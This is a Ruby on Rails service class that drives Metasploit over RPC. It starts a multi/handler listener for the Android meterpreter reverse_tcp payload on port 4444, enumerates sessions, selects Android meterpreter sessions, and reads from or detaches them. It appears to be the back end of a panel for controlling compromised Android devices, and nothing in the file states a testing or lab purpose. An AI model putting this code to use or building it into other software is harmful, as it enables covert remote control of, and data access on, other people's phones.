# frozen_string_literal: true

begin
  require 'msfrpc-client'
rescue LoadError
  Rails.logger.warn 'msfrpc-client gem not found. MSF integration disabled.'
  # Define dummy module to allow app to boot without the gem
  module Msf
    module RPC
      class Client
        def initialize(*args); end
        def login(*args); end
        def call(*args); end
      end
    end
  end
end

# Centralized Metasploit RPC client - DRY, secure, with proper error handling
# SonarQube Rules: S2068 (no hardcoded creds), S1192 (DRY), S108 (no empty catch)
class MsfRpcService
  class ConnectionError < StandardError; end
  class SessionError < StandardError; end

  ANDROID_PAYLOAD = 'android/meterpreter/reverse_tcp'
  DEFAULT_LHOST = '0.0.0.0'
  DEFAULT_LPORT = 4444

  def initialize
    @rpc = nil
  end

  # Returns connected RPC client or raises error
  def connect
    @rpc = Msf::RPC::Client.new(CredentialsService.msf_options)
    @rpc.login(CredentialsService.msf_user, CredentialsService.msf_password)
    @rpc
  rescue StandardError => e
    Rails.logger.error("MSF RPC Connection failed: #{e.message}")
    raise ConnectionError, "Cannot connect to Metasploit: #{e.message}"
  end

  # Get all active sessions
  def sessions
    ensure_connected
    @rpc.call('session.list')
  rescue StandardError => e
    Rails.logger.error("Failed to list sessions: #{e.message}")
    {}
  end

  # Find first Android meterpreter session
  def android_session_id
    sessions.each do |sid, info|
      return sid if info['type'] == 'meterpreter' && info['platform'] == 'android'
    end
    nil
  end

  # Check if any session is active
  def connected?
    sessions.any?
  rescue StandardError
    false
  end

  # Execute handler and return job info
  def start_handler(lhost: DEFAULT_LHOST, lport: DEFAULT_LPORT)
    ensure_connected
    payload_options = {
      'PAYLOAD' => ANDROID_PAYLOAD,
      'LHOST' => lhost,
      'LPORT' => lport
    }
    @rpc.call('module.execute', 'exploit', 'multi/handler', payload_options)
  rescue StandardError => e
    Rails.logger.error("Failed to start handler: #{e.message}")
    raise SessionError, "Handler start failed: #{e.message}"
  end

  # Detach session with proper error handling
  def detach_session(session_id = nil)
    ensure_connected
    session_id ||= sessions.keys.first
    raise SessionError, 'No active session to detach' unless session_id

    @rpc.call('session.meterpreter_session_detach', session_id)
    sleep 4
    read_session_output(session_id)
  rescue StandardError => e
    Rails.logger.error("Failed to detach session: #{e.message}")
    "Operation Failed: #{e.message}"
  end

  # Read meterpreter output
  def read_session_output(session_id)
    ensure_connected
    result = @rpc.call('session.meterpreter_read', session_id)
    result.values.first&.split('\n') || []
  rescue StandardError => e
    Rails.logger.error("Failed to read session: #{e.message}")
    []
  end

  private

  def ensure_connected
    connect if @rpc.nil?
  end
end
